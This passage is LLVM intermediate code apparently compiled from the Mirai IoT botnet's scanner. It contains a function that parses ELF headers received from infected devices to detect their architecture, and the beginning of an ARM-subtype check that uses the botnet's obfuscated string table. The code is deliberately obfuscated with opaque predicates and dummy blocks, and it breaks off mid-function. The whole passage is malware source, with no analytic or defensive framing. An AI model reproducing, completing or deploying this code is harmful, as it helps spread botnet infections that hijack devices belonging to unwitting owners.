; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #6

; Function Attrs: noinline nounwind uwtable
define internal i32 @parse_elf_response(%struct.scanner_connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  store i32 0, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.131, i32 0, i32 0), i8** %6, align 8
  store i32 0, i32* %4, align 4
  br label %9

; <label>:9:                                      ; preds = %originalBBpart213, %1
  %10 = load i32, i32* %4, align 4
  %11 = icmp slt i32 %10, 8192
  br i1 %11, label %12, label %103

; <label>:12:                                     ; preds = %9
  %13 = load i32, i32* @x.31
  %14 = load i32, i32* @y.32
  %15 = sub i32 %13, 1
  %16 = mul i32 %13, %15
  %17 = urem i32 %16, 2
  %18 = icmp eq i32 %17, 0
  %19 = icmp slt i32 %14, 10
  %20 = or i1 %18, %19
  br i1 %20, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %12
  %21 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %22 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %21, i32 0, i32 7
  %23 = load i32, i32* %4, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds [8192 x i8], [8192 x i8]* %22, i64 0, i64 %24
  %26 = load i8, i8* %25, align 1
  %27 = sext i8 %26 to i32
  %28 = load i8*, i8** %6, align 8
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = icmp eq i32 %27, %33
  %35 = load i32, i32* @x.31
  %36 = load i32, i32* @y.32
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %34, label %43, label %66

; <label>:43:                                     ; preds = %originalBBpart2
  %44 = load i32, i32* %5, align 4
  %45 = add nsw i32 %44, 1
  store i32 %45, i32* %5, align 4
  %46 = icmp eq i32 %45, 4
  br i1 %46, label %47, label %49

; <label>:47:                                     ; preds = %43
  %48 = load i32, i32* %4, align 4
  store i32 %48, i32* %5, align 4
  br label %103

; <label>:49:                                     ; preds = %43
  %50 = load i32, i32* @x.31
  %51 = load i32, i32* @y.32
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %49
  %58 = load i32, i32* @x.31
  %59 = load i32, i32* @y.32
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %67

; <label>:66:                                     ; preds = %originalBBpart2
  store i32 0, i32* %5, align 4
  br label %67

; <label>:67:                                     ; preds = %66, %originalBBpart24
  %68 = load i32, i32* @x.31
  %69 = load i32, i32* @y.32
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %67
  %76 = load i32, i32* @x.31
  %77 = load i32, i32* @y.32
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %84

; <label>:84:                                     ; preds = %originalBBpart28
  %85 = load i32, i32* @x.31
  %86 = load i32, i32* @y.32
  %87 = sub i32 %85, 1
  %88 = mul i32 %85, %87
  %89 = urem i32 %88, 2
  %90 = icmp eq i32 %89, 0
  %91 = icmp slt i32 %86, 10
  %92 = or i1 %90, %91
  br i1 %92, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %84
  %93 = load i32, i32* %4, align 4
  %94 = add nsw i32 %93, 1
  store i32 %94, i32* %4, align 4
  %95 = load i32, i32* @x.31
  %96 = load i32, i32* @y.32
  %97 = sub i32 %95, 1
  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
  %100 = icmp eq i32 %99, 0
  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBBpart213, label %originalBB10alteredBB

originalBBpart213:                                ; preds = %originalBB10
  br label %9

; <label>:103:                                    ; preds = %47, %9
  %104 = load i32, i32* @x.31
  %105 = load i32, i32* @y.32
  %106 = sub i32 %104, 1
  %107 = mul i32 %104, %106
  %108 = urem i32 %107, 2
  %109 = icmp eq i32 %108, 0
  %110 = icmp slt i32 %105, 10
  %111 = or i1 %109, %110
  br i1 %111, label %originalBB15, label %originalBB15alteredBB

originalBB15:                                     ; preds = %originalBB15alteredBB, %103
  %112 = load i32, i32* %5, align 4
  %113 = icmp ne i32 %112, 0
  %114 = load i32, i32* @x.31
  %115 = load i32, i32* @y.32
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBBpart217, label %originalBB15alteredBB

originalBBpart217:                                ; preds = %originalBB15
  br i1 %113, label %139, label %122

; <label>:122:                                    ; preds = %originalBBpart217
  %123 = load i32, i32* @x.31
  %124 = load i32, i32* @y.32
  %125 = sub i32 %123, 1
  %126 = mul i32 %123, %125
  %127 = urem i32 %126, 2
  %128 = icmp eq i32 %127, 0
  %129 = icmp slt i32 %124, 10
  %130 = or i1 %128, %129
  br i1 %130, label %originalBB19, label %originalBB19alteredBB

originalBB19:                                     ; preds = %originalBB19alteredBB, %122
  store i32 0, i32* %2, align 4
  %131 = load i32, i32* @x.31
  %132 = load i32, i32* @y.32
  %133 = sub i32 %131, 1
  %134 = mul i32 %131, %133
  %135 = urem i32 %134, 2
  %136 = icmp eq i32 %135, 0
  %137 = icmp slt i32 %132, 10
  %138 = or i1 %136, %137
  br i1 %138, label %originalBBpart221, label %originalBB19alteredBB

originalBBpart221:                                ; preds = %originalBB19
  br label %395

; <label>:139:                                    ; preds = %originalBBpart217
  %140 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %141 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %140, i32 0, i32 7
  %142 = load i32, i32* %5, align 4
  %143 = add nsw i32 %142, 2
  %144 = sext i32 %143 to i64
  %145 = getelementptr inbounds [8192 x i8], [8192 x i8]* %141, i64 0, i64 %144
  %146 = load i8, i8* %145, align 1
  %147 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %148 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %147, i32 0, i32 11
  store i8 %146, i8* %148, align 2
  %149 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %150 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %149, i32 0, i32 7
  %151 = load i32, i32* %5, align 4
  %152 = add nsw i32 %151, 15
  %153 = sext i32 %152 to i64
  %154 = getelementptr inbounds [8192 x i8], [8192 x i8]* %150, i64 0, i64 %153
  %155 = load i8, i8* %154, align 1
  %156 = sext i8 %155 to i16
  %157 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %158 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %157, i32 0, i32 14
  store i16 %156, i16* %158, align 2
  %159 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %160 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %159, i32 0, i32 14
  %161 = load i16, i16* %160, align 2
  %162 = zext i16 %161 to i32
  %163 = icmp eq i32 %162, 65
  br i1 %163, label %164, label %167

; <label>:164:                                    ; preds = %139
  %165 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %166 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %165, i32 0, i32 14
  store i16 8, i16* %166, align 2
  br label %167

; <label>:167:                                    ; preds = %164, %139
  %168 = load i32, i32* @x.31
  %169 = load i32, i32* @y.32
  %170 = sub i32 %168, 1
  %171 = mul i32 %168, %170
  %172 = urem i32 %171, 2
  %173 = icmp eq i32 %172, 0
  %174 = icmp slt i32 %169, 10
  %175 = or i1 %173, %174
  br i1 %175, label %originalBB23, label %originalBB23alteredBB

originalBB23:                                     ; preds = %originalBB23alteredBB, %167
  %176 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %177 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %176, i32 0, i32 14
  %178 = load i16, i16* %177, align 2
  %179 = zext i16 %178 to i32
  %180 = icmp eq i32 %179, 0
  %181 = load i32, i32* @x.31
  %182 = load i32, i32* @y.32
  %183 = sub i32 %181, 1
  %184 = mul i32 %181, %183
  %185 = urem i32 %184, 2
  %186 = icmp eq i32 %185, 0
  %187 = icmp slt i32 %182, 10
  %188 = or i1 %186, %187
  br i1 %188, label %originalBBpart225, label %originalBB23alteredBB

originalBBpart225:                                ; preds = %originalBB23
  br i1 %180, label %195, label %189

; <label>:189:                                    ; preds = %originalBBpart225
  %190 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %191 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %190, i32 0, i32 11
  %192 = load i8, i8* %191, align 2
  %193 = zext i8 %192 to i32
  %194 = icmp eq i32 %193, 0
  br i1 %194, label %195, label %196

; <label>:195:                                    ; preds = %189, %originalBBpart225
  store i32 -1, i32* %2, align 4
  br label %395

; <label>:196:                                    ; preds = %189
  %197 = load i32, i32* @x.31
  %198 = load i32, i32* @y.32
  %199 = sub i32 %197, 1
  %200 = mul i32 %197, %199
  %201 = urem i32 %200, 2
  %202 = icmp eq i32 %201, 0
  %203 = icmp slt i32 %198, 10
  %204 = or i1 %202, %203
  br i1 %204, label %originalBB27, label %originalBB27alteredBB

originalBB27:                                     ; preds = %originalBB27alteredBB, %196
  %205 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %206 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %205, i32 0, i32 14
  %207 = load i16, i16* %206, align 2
  %208 = zext i16 %207 to i32
  %209 = icmp eq i32 %208, 40
  %210 = load i32, i32* @x.31
  %211 = load i32, i32* @y.32
  %212 = sub i32 %210, 1
  %213 = mul i32 %210, %212
  %214 = urem i32 %213, 2
  %215 = icmp eq i32 %214, 0
  %216 = icmp slt i32 %211, 10
  %217 = or i1 %215, %216
  br i1 %217, label %originalBBpart229, label %originalBB27alteredBB

originalBBpart229:                                ; preds = %originalBB27
  br i1 %209, label %218, label %219

; <label>:218:                                    ; preds = %originalBBpart229
  store i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.108, i32 0, i32 0), i8** %7, align 8
  br label %388

; <label>:219:                                    ; preds = %originalBBpart229
  %220 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %221 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %220, i32 0, i32 14
  %222 = load i16, i16* %221, align 2
  %223 = zext i16 %222 to i32
  %224 = icmp eq i32 %223, 183
  br i1 %224, label %225, label %226

; <label>:225:                                    ; preds = %219
  store i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.132, i32 0, i32 0), i8** %7, align 8
  br label %387

; <label>:226:                                    ; preds = %219
  %227 = load i32, i32* @x.31
  %228 = load i32, i32* @y.32
  %229 = sub i32 %227, 1
  %230 = mul i32 %227, %229
  %231 = urem i32 %230, 2
  %232 = icmp eq i32 %231, 0
  %233 = icmp slt i32 %228, 10
  %234 = or i1 %232, %233
  br i1 %234, label %originalBB31, label %originalBB31alteredBB

originalBB31:                                     ; preds = %originalBB31alteredBB, %226
  %235 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %236 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %235, i32 0, i32 14
  %237 = load i16, i16* %236, align 2
  %238 = zext i16 %237 to i32
  %239 = icmp eq i32 %238, 62
  %240 = load i32, i32* @x.31
  %241 = load i32, i32* @y.32
  %242 = sub i32 %240, 1
  %243 = mul i32 %240, %242
  %244 = urem i32 %243, 2
  %245 = icmp eq i32 %244, 0
  %246 = icmp slt i32 %241, 10
  %247 = or i1 %245, %246
  br i1 %247, label %originalBBpart233, label %originalBB31alteredBB

originalBBpart233:                                ; preds = %originalBB31
  br i1 %239, label %248, label %249

; <label>:248:                                    ; preds = %originalBBpart233
  store i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.133, i32 0, i32 0), i8** %7, align 8
  br label %370

; <label>:249:                                    ; preds = %originalBBpart233
  %250 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %251 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %250, i32 0, i32 14
  %252 = load i16, i16* %251, align 2
  %253 = zext i16 %252 to i32
  %254 = icmp eq i32 %253, 8
  br i1 %254, label %255, label %261

; <label>:255:                                    ; preds = %249
  %256 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %257 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %256, i32 0, i32 11
  %258 = load i8, i8* %257, align 2
  %259 = zext i8 %258 to i32
  %260 = icmp eq i32 %259, 2
  br i1 %260, label %289, label %261

; <label>:261:                                    ; preds = %255, %249
  %262 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %263 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %262, i32 0, i32 14
  %264 = load i16, i16* %263, align 2
  %265 = zext i16 %264 to i32
  %266 = icmp eq i32 %265, 10
  br i1 %266, label %267, label %292

; <label>:267:                                    ; preds = %261
  %268 = load i32, i32* @x.31
  %269 = load i32, i32* @y.32
  %270 = sub i32 %268, 1
  %271 = mul i32 %268, %270
  %272 = urem i32 %271, 2
  %273 = icmp eq i32 %272, 0
  %274 = icmp slt i32 %269, 10
  %275 = or i1 %273, %274
  br i1 %275, label %originalBB35, label %originalBB35alteredBB

originalBB35:                                     ; preds = %originalBB35alteredBB, %267
  %276 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %277 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %276, i32 0, i32 11
  %278 = load i8, i8* %277, align 2
  %279 = zext i8 %278 to i32
  %280 = icmp eq i32 %279, 2
  %281 = load i32, i32* @x.31
  %282 = load i32, i32* @y.32
  %283 = sub i32 %281, 1
  %284 = mul i32 %281, %283
  %285 = urem i32 %284, 2
  %286 = icmp eq i32 %285, 0
  %287 = icmp slt i32 %282, 10
  %288 = or i1 %286, %287
  br i1 %288, label %originalBBpart237, label %originalBB35alteredBB

originalBBpart237:                                ; preds = %originalBB35
  br i1 %280, label %289, label %292

; <label>:289:                                    ; preds = %originalBBpart237, %255
  %290 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %291 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %290, i32 0, i32 14
  store i16 8, i16* %291, align 2
  store i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.134, i32 0, i32 0), i8** %7, align 8
  br label %369

; <label>:292:                                    ; preds = %originalBBpart237, %261
  %293 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %294 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %293, i32 0, i32 14
  %295 = load i16, i16* %294, align 2
  %296 = zext i16 %295 to i32
  %297 = icmp eq i32 %296, 8
  br i1 %297, label %298, label %320

; <label>:298:                                    ; preds = %292
  %299 = load i32, i32* @x.31
  %300 = load i32, i32* @y.32
  %301 = sub i32 %299, 1
  %302 = mul i32 %299, %301
  %303 = urem i32 %302, 2
  %304 = icmp eq i32 %303, 0
  %305 = icmp slt i32 %300, 10
  %306 = or i1 %304, %305
  br i1 %306, label %originalBB39, label %originalBB39alteredBB

originalBB39:                                     ; preds = %originalBB39alteredBB, %298
  %307 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %308 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %307, i32 0, i32 11
  %309 = load i8, i8* %308, align 2
  %310 = zext i8 %309 to i32
  %311 = icmp eq i32 %310, 1
  %312 = load i32, i32* @x.31
  %313 = load i32, i32* @y.32
  %314 = sub i32 %312, 1
  %315 = mul i32 %312, %314
  %316 = urem i32 %315, 2
  %317 = icmp eq i32 %316, 0
  %318 = icmp slt i32 %313, 10
  %319 = or i1 %317, %318
  br i1 %319, label %originalBBpart241, label %originalBB39alteredBB

originalBBpart241:                                ; preds = %originalBB39
  br i1 %311, label %332, label %320

; <label>:320:                                    ; preds = %originalBBpart241, %292
  %321 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %322 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %321, i32 0, i32 14
  %323 = load i16, i16* %322, align 2
  %324 = zext i16 %323 to i32
  %325 = icmp eq i32 %324, 10
  br i1 %325, label %326, label %335

; <label>:326:                                    ; preds = %320
  %327 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %328 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %327, i32 0, i32 11
  %329 = load i8, i8* %328, align 2
  %330 = zext i8 %329 to i32
  %331 = icmp eq i32 %330, 1
  br i1 %331, label %332, label %335

; <label>:332:                                    ; preds = %326, %originalBBpart241
  %333 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %334 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %333, i32 0, i32 14
  store i16 8, i16* %334, align 2
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.135, i32 0, i32 0), i8** %7, align 8
  br label %352

; <label>:335:                                    ; preds = %326, %320
  %336 = load i32, i32* @x.31
  %337 = load i32, i32* @y.32
  %338 = sub i32 %336, 1
  %339 = mul i32 %336, %338
  %340 = urem i32 %339, 2
  %341 = icmp eq i32 %340, 0
  %342 = icmp slt i32 %337, 10
  %343 = or i1 %341, %342
  br i1 %343, label %originalBB43, label %originalBB43alteredBB

originalBB43:                                     ; preds = %originalBB43alteredBB, %335
  store i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.116, i32 0, i32 0), i8** %7, align 8
  %344 = load i32, i32* @x.31
  %345 = load i32, i32* @y.32
  %346 = sub i32 %344, 1
  %347 = mul i32 %344, %346
  %348 = urem i32 %347, 2
  %349 = icmp eq i32 %348, 0
  %350 = icmp slt i32 %345, 10
  %351 = or i1 %349, %350
  br i1 %351, label %originalBBpart245, label %originalBB43alteredBB

originalBBpart245:                                ; preds = %originalBB43
  br label %352

; <label>:352:                                    ; preds = %originalBBpart245, %332
  %353 = load i32, i32* @x.31
  %354 = load i32, i32* @y.32
  %355 = sub i32 %353, 1
  %356 = mul i32 %353, %355
  %357 = urem i32 %356, 2
  %358 = icmp eq i32 %357, 0
  %359 = icmp slt i32 %354, 10
  %360 = or i1 %358, %359
  br i1 %360, label %originalBB47, label %originalBB47alteredBB

originalBB47:                                     ; preds = %originalBB47alteredBB, %352
  %361 = load i32, i32* @x.31
  %362 = load i32, i32* @y.32
  %363 = sub i32 %361, 1
  %364 = mul i32 %361, %363
  %365 = urem i32 %364, 2
  %366 = icmp eq i32 %365, 0
  %367 = icmp slt i32 %362, 10
  %368 = or i1 %366, %367
  br i1 %368, label %originalBBpart249, label %originalBB47alteredBB

originalBBpart249:                                ; preds = %originalBB47
  br label %369

; <label>:369:                                    ; preds = %originalBBpart249, %289
  br label %370

; <label>:370:                                    ; preds = %369, %248
  %371 = load i32, i32* @x.31
  %372 = load i32, i32* @y.32
  %373 = sub i32 %371, 1
  %374 = mul i32 %371, %373
  %375 = urem i32 %374, 2
  %376 = icmp eq i32 %375, 0
  %377 = icmp slt i32 %372, 10
  %378 = or i1 %376, %377
  br i1 %378, label %originalBB51, label %originalBB51alteredBB

originalBB51:                                     ; preds = %originalBB51alteredBB, %370
  %379 = load i32, i32* @x.31
  %380 = load i32, i32* @y.32
  %381 = sub i32 %379, 1
  %382 = mul i32 %379, %381
  %383 = urem i32 %382, 2
  %384 = icmp eq i32 %383, 0
  %385 = icmp slt i32 %380, 10
  %386 = or i1 %384, %385
  br i1 %386, label %originalBBpart253, label %originalBB51alteredBB

originalBBpart253:                                ; preds = %originalBB51
  br label %387

; <label>:387:                                    ; preds = %originalBBpart253, %225
  br label %388

; <label>:388:                                    ; preds = %387, %218
  %389 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %390 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %389, i32 0, i32 8
  %391 = getelementptr inbounds [16 x i8], [16 x i8]* %390, i32 0, i32 0
  %392 = load i8*, i8** %7, align 8
  %393 = call i8* @strcpy(i8* %391, i8* %392) #7
  %394 = load i32, i32* %5, align 4
  store i32 %394, i32* %2, align 4
  br label %395

; <label>:395:                                    ; preds = %388, %195, %originalBBpart221
  %396 = load i32, i32* %2, align 4
  ret i32 %396

originalBBalteredBB:                              ; preds = %originalBB, %12
  %397 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %398 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %397, i32 0, i32 7
  %399 = load i32, i32* %4, align 4
  %400 = sext i32 %399 to i64
  %401 = getelementptr inbounds [8192 x i8], [8192 x i8]* %398, i64 0, i64 %400
  %402 = load i8, i8* %401, align 1
  %403 = sext i8 %402 to i32
  %404 = load i8*, i8** %6, align 8
  %405 = load i32, i32* %5, align 4
  %406 = sext i32 %405 to i64
  %407 = getelementptr inbounds i8, i8* %404, i64 %406
  %408 = load i8, i8* %407, align 1
  %409 = sext i8 %408 to i32
  %410 = icmp eq i32 %403, %409
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %49
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %67
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %84
  %411 = load i32, i32* %4, align 4
  %_ = shl i32 %411, 1
  %_11 = shl i32 %411, 1
  %412 = add nsw i32 %411, 1
  store i32 %412, i32* %4, align 4
  br label %originalBB10

originalBB15alteredBB:                            ; preds = %originalBB15, %103
  %413 = load i32, i32* %5, align 4
  %414 = icmp ne i32 %413, 0
  br label %originalBB15

originalBB19alteredBB:                            ; preds = %originalBB19, %122
  store i32 0, i32* %2, align 4
  br label %originalBB19

originalBB23alteredBB:                            ; preds = %originalBB23, %167
  %415 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %416 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %415, i32 0, i32 14
  %417 = load i16, i16* %416, align 2
  %418 = zext i16 %417 to i32
  %419 = icmp eq i32 %418, 0
  br label %originalBB23

originalBB27alteredBB:                            ; preds = %originalBB27, %196
  %420 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %421 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %420, i32 0, i32 14
  %422 = load i16, i16* %421, align 2
  %423 = zext i16 %422 to i32
  %424 = icmp eq i32 %423, 40
  br label %originalBB27

originalBB31alteredBB:                            ; preds = %originalBB31, %226
  %425 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %426 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %425, i32 0, i32 14
  %427 = load i16, i16* %426, align 2
  %428 = zext i16 %427 to i32
  %429 = icmp eq i32 %428, 62
  br label %originalBB31

originalBB35alteredBB:                            ; preds = %originalBB35, %267
  %430 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %431 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %430, i32 0, i32 11
  %432 = load i8, i8* %431, align 2
  %433 = zext i8 %432 to i32
  %434 = icmp eq i32 %433, 2
  br label %originalBB35

originalBB39alteredBB:                            ; preds = %originalBB39, %298
  %435 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %436 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %435, i32 0, i32 11
  %437 = load i8, i8* %436, align 2
  %438 = zext i8 %437 to i32
  %439 = icmp eq i32 %438, 1
  br label %originalBB39

originalBB43alteredBB:                            ; preds = %originalBB43, %335
  store i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.116, i32 0, i32 0), i8** %7, align 8
  br label %originalBB43

originalBB47alteredBB:                            ; preds = %originalBB47, %352
  br label %originalBB47

originalBB51alteredBB:                            ; preds = %originalBB51, %370
  br label %originalBB51
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_arm_subtype(%struct.scanner_connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  call void @table_unlock_val(i8 zeroext 12)
  %7 = call i8* @table_retrieve_val(i32 12, i32* %6)
  store i8* %7, i8** %4, align 8
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [8192 x i8], [8192 x i8]* %9, i32 0, i32 0
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 4
  %13 = load i32, i32* %12, align 8
  %14 = load i8*, i8** %4, align 8
  %15 = load i32, i32* %6, align 4
  %16 = sub nsw i32 %15, 1
  %17 = call i32 @util_memsearch(i8* %10, i32 %13, i8* %14, i32 %16)
  store i32 %17, i32* %5, align 4
  call void @table_lock_val(i8 zeroext 12)
  %18 = load i32, i32* %5, align 4
  %19 = icmp eq i32 %18, -1
  br i1 %19, label %20, label %21

; <label>:20:                                     ; preds = %1
  store i32 0, i32* %2, align 4
  br label %99

; <label>:21:                                     ; preds = %1
  %22 = load i32, i32* @x.33
  %23 = load i32, i32* @y.34
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %21
  %30 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %31 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %30, i32 0, i32 7
  %32 = getelementptr inbounds [8192 x i8], [8192 x i8]* %31, i32 0, i32 0
  %33 = load i32, i32* %5, align 4
  %34 = sub nsw i32 %33, 1
  %35 = call i32 @util_memsearch(i8* %32, i32 %34, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.136, i32 0, i32 0), i32 5)
  %36 = icmp ne i32 %35, -1
  %37 = load i32, i32* @x.33
  %38 = load i32, i32* @y.34
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %36, label %69, label %45

; <label>:45:                                     ; preds = %originalBBpart2
  %46 = load i32, i32* @x.33
  %47 = load i32, i32* @y.34
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBB2, label %originalBB2alteredBB

originalBB2:                                      ; preds = %originalBB2alteredBB, %45
  %54 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %55 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %54, i32 0, i32 7
  %56 = getelementptr inbounds [8192 x i8], [8192 x i8]* %55, i32 0, i32 0
  %57 = load i32, i32* %5, align 4
  %58 = sub nsw i32 %57, 1
  %59 = call i32 @util_memsearch(i8* %56, i32 %58, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.137, i32 0, i32 0), i32 5)
  %60 = icmp ne i32 %59, -1
  %61 = load i32, i32* @x.33
  %62 = load i32, i32* @y.34
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBBpart214, label %originalBB2alteredBB

originalBBpart214:                                ; preds = %originalBB2
  br i1 %60, label %69, label %92

; <label>:69:                                     ; preds = %originalBBpart214, %originalBBpart2
  %70 = load i32, i32* @x.33
  %71 = load i32, i32* @y.34
  %72 = sub i32 %70, 1
